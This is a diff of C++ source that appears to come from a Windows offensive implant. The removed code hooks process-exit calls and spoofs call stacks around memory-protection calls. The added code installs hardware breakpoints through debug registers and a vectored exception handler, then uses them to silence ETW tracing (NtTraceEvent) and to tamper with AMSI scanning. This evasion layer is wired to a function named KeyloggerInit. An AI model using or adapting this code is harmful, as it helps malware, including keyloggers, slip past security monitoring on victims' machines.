@@ -1,312 +1,215 @@
 #include <General.hpp>
 
-namespace Hook {
-
-//==============================================================================
-// Exit Prevention Hooks
-//==============================================================================
-
-class ExitHandler {
-public:
-    static auto RtlExitUserProcess(LONG ExitCode) -> VOID {
-        // Prevent process exit - do nothing
-        return;
-    }
-
-    static auto NtTerminateProcess(HANDLE Handle, UINT ExitCode) -> BOOL {
-        auto* instance = GetInstance();
-        
-        if (Handle == NtCurrentProcess()) {
-            instance->Win32.ExitThread(ExitCode);
-            return TRUE;
-        }
-        
-        return instance->Win32.NtTerminateProcess(Handle, ExitCode);
-    }
-
-private:
-    static auto GetInstance() -> INSTANCE* {
-        return reinterpret_cast<INSTANCE*>(NtCurrentPeb()->TelemetryCoverageHeader);
-    }
-};
-
-//==============================================================================
-// Memory Management Hooks
-//==============================================================================
-
-class MemoryManager {
-public:
-    static auto NtAllocateVirtualMemory(
-        HANDLE ProcessHandle,
-        PVOID* BaseAddress,
-        ULONG_PTR ZeroBits,
-        SIZE_T* RegionSize,
-        ULONG AllocType,
-        ULONG Protect
-    ) -> LONG {
-        return AllocVm( ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocType, Protect );
-    }
-
-    static auto VirtualAlloc(
-        PVOID  Address,
-        SIZE_T Size,
-        ULONG  AllocType,
-        ULONG  Protect
-    ) -> PVOID {
-        auto*  instance = GetInstance();
-        PVOID  addrTemp = Address;
-        SIZE_T sizeTemp = Size;
-        
-        const LONG status = NtAllocateVirtualMemory(
-            NtCurrentProcess(), &addrTemp, 0, &sizeTemp, AllocType, Protect
-        );
-        
-        SetLastError( instance->Win32.RtlNtStatusToDosError( status ) );
-        return addrTemp;
-    }
-
-    static auto VirtualAllocEx(
-        HANDLE ProcessHandle,
-        PVOID Address,
-        SIZE_T Size,
-        ULONG AllocType,
-        ULONG Protect
-    ) -> PVOID {
-        auto* instance = GetInstance();
-        PVOID addrTemp = Address;
-        SIZE_T sizeTemp = Size;
-        
-        const LONG status = NtAllocateVirtualMemory(
-            ProcessHandle,
-            &addrTemp,
-            0,
-            &sizeTemp,
-            AllocType,
-            Protect
-        );
-        
-        SetLastError(instance->Win32.RtlNtStatusToDosError(status));
-        return addrTemp;
-    }
-
-    static auto NtWriteVirtualMemory(
-        HANDLE ProcessHandle,
-        PVOID BaseAddress,
-        PVOID Buffer,
-        SIZE_T Size,
-        SIZE_T* Written
-    ) -> LONG {
-        return WriteVm(ProcessHandle, BaseAddress, Buffer, Size, Written);
-    }
-
-    static auto WriteProcessMemory(
-        HANDLE ProcessHandle,
-        PVOID BaseAddress,
-        PVOID Buffer,
-        SIZE_T Size,
-        SIZE_T* Written
-    ) -> BOOL {
-        auto* instance = GetInstance();
-        
-        const LONG status = NtWriteVirtualMemory(
-            ProcessHandle,
-            BaseAddress,
-            Buffer,
-            Size,
-            Written
-        );
-        
-        SetLastError(instance->Win32.RtlNtStatusToDosError(status));
-        return (status == STATUS_SUCCESS);
-    }
-
-    static auto NtProtectVirtualMemory(
-        HANDLE ProcessHandle,
-        PVOID* BaseAddress,
-        SIZE_T* RegionSize,
-        ULONG NewProtection,
-        ULONG* OldProtection
-    ) -> NTSTATUS {
-        auto* instance = GetInstance();
-        
-        if (!instance->Ctx.IsSpoof) {
-            return instance->Win32.NtProtectVirtualMemory(
-                ProcessHandle,
-                BaseAddress,
-                RegionSize,
-                NewProtection,
-                OldProtection
-            );
-        }
-        
-        return static_cast<NTSTATUS>(
-            Spoof::Call(
-                reinterpret_cast<PVOID>(instance->Win32.NtProtectVirtualMemory),
-                nullptr,
-                reinterpret_cast<PVOID>(ProcessHandle),
-                reinterpret_cast<PVOID>(BaseAddress),
-                reinterpret_cast<PVOID>(RegionSize),
-                reinterpret_cast<PVOID>(NewProtection),
-                reinterpret_cast<PVOID>(OldProtection)
-            )
-        );
-    }
-
-    static auto VirtualProtect(
-        LPVOID Address,
-        SIZE_T Size,
-        DWORD NewProtect,
-        PDWORD OldProtect
-    ) -> BOOL {
-        auto* instance = GetInstance();
-        PVOID addr = Address;
-        SIZE_T size = Size;
-        ULONG oldProt = 0;
-        
-        const NTSTATUS status = NtProtectVirtualMemory(
-            NtCurrentProcess(),
-            &addr,
-            &size,
-            NewProtect,
-            &oldProt
-        );
-        
-        if (OldProtect) {
-            *OldProtect = oldProt;
-        }
-        
-        SetLastError(instance->Win32.RtlNtStatusToDosError(status));
-        return NT_SUCCESS(status);
-    }
-
-    static auto VirtualProtectEx(
-        HANDLE ProcessHandle,
-        LPVOID Address,
-        SIZE_T Size,
-        DWORD NewProtect,
-        PDWORD OldProtect
-    ) -> BOOL {
-        auto* instance = GetInstance();
-        PVOID addr = Address;
-        SIZE_T size = Size;
-        ULONG oldProt = 0;
-        
-        const NTSTATUS status = NtProtectVirtualMemory(
-            ProcessHandle,
-            &addr,
-            &size,
-            NewProtect,
-            &oldProt
-        );
-        
-        if (OldProtect) {
-            *OldProtect = oldProt;
-        }
-        
-        SetLastError(instance->Win32.RtlNtStatusToDosError(status));
-        return NT_SUCCESS(status);
-    }
-
-private:
-    static auto GetInstance() -> INSTANCE* {
-        return reinterpret_cast<INSTANCE*>(NtCurrentPeb()->TelemetryCoverageHeader);
+auto DECLFN Hwbp::SetDr7(
+    _In_ UPTR ActVal,
+    _In_ UPTR NewVal,
+    _In_ INT  StartPos,
+    _In_ INT  BitsCount
+) -> UPTR {
+    if (StartPos < 0 || BitsCount <= 0 || StartPos + BitsCount > 64) {
+        return ActVal;
     }
     
-    static auto SetLastError(DWORD error) -> VOID {
-        NtCurrentTeb()->LastErrorValue = error;
+    UPTR Mask = (1ULL << BitsCount) - 1ULL;
+    return (ActVal & ~(Mask << StartPos)) | ((NewVal & Mask) << StartPos);
+}
+
+auto DECLFN Hwbp::Init( VOID ) -> BOOL {
+    G_INSTANCE
+
+    if ( Instance->Hwbp.Init ) return TRUE;
+
+    PVOID ExceptionHandler = (PVOID)&Hwbp::HandleException;
+
+    Instance->Hwbp.Handler = Instance->Win32.RtlAddVectoredExceptionHandler(
+        TRUE, (PVECTORED_EXCEPTION_HANDLER)ExceptionHandler
+    );
+
+    Instance->Hwbp.Init = TRUE;
+
+    return TRUE;
+}
+
+auto DECLFN Hwbp::Install(
+    _In_ UPTR  Address,
+    _In_ INT8  Drx,
+    _In_ PVOID Callback
+) -> BOOL {
+    G_INSTANCE
+
+    if (Drx < 0 || Drx > 3) return FALSE;
+
+    Instance->Hwbp.Callbacks[Drx] = (UPTR)Callback;
+    Instance->Hwbp.Addresses[Drx] = Address;
+
+
+    return Hwbp::SetBreak(Address, Drx, TRUE);
+}
+
+auto DECLFN Hwbp::SetBreak(
+    UPTR  Address,
+    INT8  Drx,
+    BOOL  Init
+) -> BOOL {
+    G_INSTANCE
+
+    if (Drx < 0 || Drx > 3) return FALSE;
+
+    CONTEXT  Ctx    = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
+    HANDLE   Handle = NtCurrentThread();
+    NTSTATUS Status = STATUS_SUCCESS;
+
+    Status = Instance->Win32.NtGetContextThread(Handle, &Ctx);
+
+
+    if (Init) {
+        (&Ctx.Dr0)[Drx] = Address;
+        Ctx.Dr7 = Hwbp::SetDr7(Ctx.Dr7, 3, (Drx * 2), 2); // active breakpoint
+    } else {
+        (&Ctx.Dr0)[Drx] = 0;
+        Ctx.Dr7 = Hwbp::SetDr7(Ctx.Dr7, 0, (Drx * 2), 2); // desactive breakpoint
     }
-};
+    
+    Status = Instance->Win32.NtContinue( &Ctx, FALSE );
 
-auto RtlExitUserProcess(LONG ExitCode) -> VOID {
-    return ExitHandler::RtlExitUserProcess(ExitCode);
+    return NT_SUCCESS(Status);
 }
 
-auto NtTerminateProcess(HANDLE Handle, UINT ExitCode) -> BOOL {
-    return ExitHandler::NtTerminateProcess(Handle, ExitCode);
+auto DECLFN Hwbp::GetArg(
+    _In_ PCONTEXT Ctx,
+    _In_ ULONG    Idx
+) -> UPTR {
+#ifdef _WIN64
+    switch (Idx) {
+        case 1: return Ctx->Rcx;
+        case 2: return Ctx->Rdx;
+        case 3: return Ctx->R8;
+        case 4: return Ctx->R9;
+    }
+    return *(UPTR*)(Ctx->Rsp + (Idx * sizeof(PVOID)));
+#else
+    return *(ULONG*)(Ctx->Esp + (Idx * sizeof(PVOID)));
+#endif
 }
 
-auto NtAllocateVirtualMemory(
-    HANDLE ProcessHandle,
-    PVOID* BaseAddress,
-    ULONG_PTR ZeroBits,
-    SIZE_T* RegionSize,
-    ULONG AllocType,
-    ULONG Protect
+auto DECLFN Hwbp::SetArg(
+    _In_ PCONTEXT Ctx,
+    _In_ UPTR     Val,
+    _In_ ULONG    Idx
+) -> VOID {
+#ifdef _WIN64
+    switch (Idx) {
+        case 1: Ctx->Rcx = Val; return;
+        case 2: Ctx->Rdx = Val; return;
+        case 3: Ctx->R8 = Val; return;
+        case 4: Ctx->R9 = Val; return;
+    }
+    *(UPTR*)(Ctx->Rsp + (Idx * sizeof(PVOID))) = Val;
+#else
+    *(ULONG*)(Ctx->Esp + (Idx * sizeof(PVOID))) = Val;
+#endif
+}
+
+auto DECLFN Hwbp::HandleException(
+    EXCEPTION_POINTERS* e
 ) -> LONG {
-    return MemoryManager::NtAllocateVirtualMemory(
-        ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocType, Protect
-    );
+    G_INSTANCE
+
+
+    if ( e->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP ) {
+        return EXCEPTION_CONTINUE_SEARCH;
+    }
+
+    INT8 Drx = -1;
+    for ( INT8 i = 0; i < 4; i++ ) {
+        if ( e->ExceptionRecord->ExceptionAddress == (PVOID)Instance->Hwbp.Addresses[i] ) { 
+            Drx = i;
+            break;
+        }
+    }
+
+    if (Drx == -1 || !Instance->Hwbp.Callbacks[Drx]) {
+        return EXCEPTION_CONTINUE_SEARCH;
+    }
+
+
+    Hwbp::SetBreak( Instance->Hwbp.Addresses[Drx], Drx, FALSE);
+
+
+    VOID ( * CallBackRun )( PCONTEXT )= reinterpret_cast<decltype(CallBackRun)>(Instance->Hwbp.Callbacks[Drx]);
+    CallBackRun(e->ContextRecord);
+
+
+    Hwbp::SetBreak( Instance->Hwbp.Addresses[Drx], Drx, TRUE);
+
+
+    return EXCEPTION_CONTINUE_EXECUTION;
 }
 
-auto VirtualAlloc(PVOID Address, SIZE_T Size, ULONG AllocType, ULONG Protect) -> PVOID {
-    return MemoryManager::VirtualAlloc( Address, Size, AllocType, Protect );
+auto DECLFN Hwbp::PatchExitDetour(PCONTEXT Ctx) -> VOID {
+    Ctx->Rax = 0;
+    Ctx->Rip = *(UPTR*)Ctx->Rsp;
+    Ctx->Rsp += sizeof(PVOID);
+} 
+
+auto DECLFN Hwbp::KeyloggerInit( INT32 BypassFlags ) -> BOOL {
+    G_INSTANCE
+
+    if (!Hwbp::Init()) return FALSE;
+
+    BOOL Success = TRUE;
+
+    if ( BypassFlags ) {
+        if ( BypassFlags == KEYLOGGER_BYPASS_ETW || BypassFlags == KEYLOGGER_BYPASS_ALL ) {
+            Success = Hwbp::Install( (UPTR)Instance->Hwbp.NtTraceEvent, Dr::x1, (PVOID)Hwbp::EtwDetour );
+            if ( ! Success ) return Success;
+        }
+
+        if ( BypassFlags == KEYLOGGER_BYPASS_AMSI || BypassFlags == KEYLOGGER_BYPASS_ALL ) {
+            Success = Hwbp::Install( (UPTR)Instance->Hwbp.AmsiScanBuffer, Dr::x2, (PVOID)Hwbp::AmsiDetour );
+            if ( ! Success ) return Success;
+        }
+    }
+
+    return Success;
 }
 
-auto VirtualAllocEx(
-    HANDLE ProcessHandle,
-    PVOID Address,
-    SIZE_T Size,
-    ULONG AllocType,
-    ULONG Protect
-) -> PVOID {
-    return MemoryManager::VirtualAllocEx( ProcessHandle, Address, Size, AllocType, Protect );
+auto DECLFN Hwbp::Clean() -> BOOL {
+    G_INSTANCE
+
+    CONTEXT Ctx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
+    
+    Instance->Win32.NtGetContextThread( NtCurrentThread(), &Ctx );
+    
+    Ctx.Dr0 = 0;
+    Ctx.Dr1 = 0;
+    Ctx.Dr2 = 0;
+    Ctx.Dr3 = 0;
+    Ctx.Dr7 = 0;
+    
+    for (INT8 i = 0; i < 4; i++) {
+        Instance->Hwbp.Callbacks[i] = (UPTR)nullptr;
+        Instance->Hwbp.Addresses[i] = 0;
+    }
+
+    Instance->Win32.RtlRemoveVectoredExceptionHandler( Instance->Hwbp.Handler );
+    
+    return Instance->Win32.NtContinue( &Ctx, FALSE );
 }
 
-auto NtWriteVirtualMemory(
-    HANDLE ProcessHandle,
-    PVOID BaseAddress,
-    PVOID Buffer,
-    SIZE_T Size,
-    SIZE_T* Written
-) -> LONG {
-    return MemoryManager::NtWriteVirtualMemory(
-        ProcessHandle, BaseAddress, Buffer, Size, Written
-    );
+auto DECLFN Hwbp::KeyloggerExit() -> BOOL {
+    return Hwbp::Clean();
 }
 
-auto WriteProcessMemory(
-    HANDLE ProcessHandle,
-    PVOID BaseAddress,
-    PVOID Buffer,
-    SIZE_T Size,
-    SIZE_T* Written
-) -> BOOL {
-    return MemoryManager::WriteProcessMemory(
-        ProcessHandle, BaseAddress, Buffer, Size, Written
-    );
+auto DECLFN Hwbp::EtwDetour( PCONTEXT Ctx ) -> VOID {
+    Ctx->Rip  = *(UPTR*)Ctx->Rsp;
+    Ctx->Rsp += sizeof(PVOID);
+    Ctx->Rax  = STATUS_SUCCESS;
 }
 
-auto VirtualProtect(
-    LPVOID Address,
-    SIZE_T Size,
-    DWORD NewProtect,
-    PDWORD OldProtect
-) -> BOOL {
-    return MemoryManager::VirtualProtect( Address, Size, NewProtect, OldProtect );
-}
+auto DECLFN Hwbp::AmsiDetour( PCONTEXT Ctx ) -> VOID {
+    G_INSTANCE
 
-auto VirtualProtectEx(
-    HANDLE ProcessHandle,
-    LPVOID Address,
-    SIZE_T Size,
-    DWORD NewProtect,
-    PDWORD OldProtect
-) -> BOOL {
-    return MemoryManager::VirtualProtectEx(
-        ProcessHandle, Address, Size, NewProtect, OldProtect
-    );
+    Ctx->Rdx    = (UPTR)LoadApi(LoadModule(HashStr("ntdll.dll")), HashStr("NtAllocateVirtualMemory"));
+    Ctx->EFlags = (Ctx->EFlags | (1 << 16)); 
 }
-
-auto NtProtectVirtualMemory(
-    HANDLE  ProcessHandle,
-    PVOID*  BaseAddress,
-    SIZE_T* RegionSize,
-    ULONG   NewProtection,
-    ULONG*  OldProtection
-) -> NTSTATUS {
-    return MemoryManager::NtProtectVirtualMemory(
-        ProcessHandle, BaseAddress, RegionSize, NewProtection, OldProtection
-    );
-}
-
-} // namespace Hook
